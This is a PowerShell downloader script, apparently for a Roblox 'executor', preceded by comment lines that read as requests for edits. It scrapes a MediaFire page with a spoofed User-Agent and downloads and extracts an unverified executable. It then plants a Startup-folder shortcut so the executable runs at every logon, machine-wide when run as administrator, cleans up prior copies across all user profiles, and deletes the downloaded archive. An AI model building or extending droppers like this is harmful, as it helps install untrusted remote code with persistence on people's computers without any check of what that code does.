#can you add safe bounds for the shortcut (not if it can run or not via boleen variable) where if that shortcut exists it's deleted so duplicates aren't made
#can you also change the safe bounds system so it only deletes in local via isadmin false but when isadmin = true it checks the zip and folder location for all profiles and deletes them then continues?
#location 2 (already merged section 8)
# ==============================
# 1. Variables & Path Resolution
# ==============================
$mediaFireUrl = "https://www.mediafire.com/file/9nsf2a4wno9cgfd/"
$zipName = "Real.zip"
$exeName = "RealSetup.exe"
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    $targetPath = $env:ProgramData
    $startmenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
} else {
    $targetPath = $env:LocalAppData
    $startmenuPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
}
$zipPath = Join-Path $targetPath $zipName
$extractPath = Join-Path $targetPath "Real"
$shortcutName = "Real.lnk"
$shortcutFile = Join-Path $startmenuPath $shortcutName
$runExe = $false
$openUrl = $false
# ==============================
# 2. Clean previous files and shortcuts
# ==============================
if ($isAdmin) {
    # Check every existing user profile.
    $profilePaths = Get-CimInstance -ClassName Win32_UserProfile -ErrorAction Stop |
    Where-Object { -not $_.Special -and $_.LocalPath } |
    Select-Object -ExpandProperty LocalPath -Unique
    foreach ($profilePath in $profilePaths) {
        $userExtractPath = Join-Path $profilePath "AppData\Local\Real"
        $userShortcutPath = Join-Path $profilePath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Real.lnk"
        if (Test-Path -LiteralPath $userExtractPath) {
            Remove-Item -LiteralPath $userExtractPath -Recurse -Force -ErrorAction Stop
        }
        if (Test-Path -LiteralPath $userShortcutPath) {
            Remove-Item -LiteralPath $userShortcutPath -Force -ErrorAction Stop
        }
    }
    # Clean the shared ProgramData extraction folder.
    if (Test-Path -LiteralPath $extractPath) {
        Remove-Item -LiteralPath $extractPath -Recurse -Force -ErrorAction Stop
    }
    # Clean the shared Startup shortcut.
    if (Test-Path -LiteralPath $shortcutFile) {
        Remove-Item -LiteralPath $shortcutFile -Force -ErrorAction Stop
    }
} else {
    # Clean only this user's extraction folder.
    if (Test-Path -LiteralPath $extractPath) {
        Remove-Item -LiteralPath $extractPath -Recurse -Force -ErrorAction Stop
    }
    # Clean only this user's Startup shortcut.
    if (Test-Path -LiteralPath $shortcutFile) {
        Remove-Item -LiteralPath $shortcutFile -Force -ErrorAction Stop
    }
}
# Recreate the selected installation directory.
New-Item -ItemType Directory -Path $extractPath -Force -ErrorAction Stop |
Out-Null
# ==============================
# 3. Get MediaFire page
# ==============================
$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
}
Write-Host "Getting MediaFire page..."
try {
    $page = Invoke-WebRequest `
        -Uri $mediaFireUrl `
        -Headers $headers `
        -UseBasicParsing `
        -MaximumRedirection 10 `
        -TimeoutSec 60 `
        -ErrorAction Stop
}
catch {
    throw "Could not access MediaFire page: $($_.Exception.Message)"
}
# ==============================
# 4. Find download URL
# ==============================
$directUrl = $null
# First try parsed links
$directUrl = $page.Links |
    Where-Object {
        $_.href -and
        $_.href -match 'download.*mediafire\.com'
    } |
    Select-Object -ExpandProperty href -First 1
# If that failed, search raw HTML
if (-not $directUrl) {
    $pattern = 'https?://[^"''<>\s]+mediafire\.com[^"''<>\s]*'
    $matches = [regex]::Matches($page.Content, $pattern)
    foreach ($match in $matches) {
        if ($match.Value -match 'download') {
            $directUrl = $match.Value
            break
        }
    }
}
if (-not $directUrl) {
    throw "Could not locate the MediaFire download URL."
}
Write-Host ""
Write-Host "Direct URL:"
Write-Host $directUrl
Write-Host ""
# ==============================
# 5. Download using curl.exe
# ==============================
if (Test-Path -LiteralPath $zipPath) {
    Remove-Item -LiteralPath $zipPath -Force
}
Write-Host "Downloading to:"
Write-Host $zipPath
$curlArgs = @(
    "--location"
    "--fail"
    "--retry", "3"
    "--retry-delay", "2"
    "--connect-timeout", "30"
    "--max-time", "600"
    "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "-o", $zipPath
    $directUrl
)
& curl.exe @curlArgs
if ($LASTEXITCODE -ne 0) {
    throw "curl download failed with exit code $LASTEXITCODE"
}
# ==============================
# 6. Verify download
# ==============================
if (-not (Test-Path -LiteralPath $zipPath)) {
    throw "Download failed: file was not created."
}
$file = Get-Item -LiteralPath $zipPath
Write-Host "Downloaded:"
Write-Host "$($file.FullName)"
Write-Host "Size: $($file.Length) bytes"
if ($file.Length -lt 1000) {
    throw "Downloaded file is suspiciously small."
}
# ==============================
# 7. Extract
# ==============================
Write-Host "Extracting..."
& tar.exe -xf $zipPath -C $extractPath
if ($LASTEXITCODE -ne 0) {
    throw "tar extraction failed with exit code $LASTEXITCODE"
}
# ==============================
# 8. Link in Start Up
# ==============================
$exePath = Join-Path $extractPath $exeName
if (-not (Test-Path -LiteralPath $exePath)) {
    throw "EXE not found: $exePath"
}
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($shortcutFile)
$Shortcut.TargetPath = $exePath
$Shortcut.WorkingDirectory = Split-Path -Parent $exePath
$Shortcut.Save()
# ==============================
# 9. Run EXE & Open Ryos Real
# ==============================
if ($runExe) {
    Write-Host "Starting $exePath"
    Start-Process -FilePath $exePath
} else {
    Write-Host "Skipping EXE launch."
}
Write-Host "Removing $zipPath"
Remove-Item -LiteralPath $zipPath -Force
if ($openUrl) {
    Start-Process "https://www.roblxexecutors.com:443/start/real"
} else {
    Write-Host "Skipping Url launch."
}
Write-Host "Done!"; [Environment]::Exit(0)
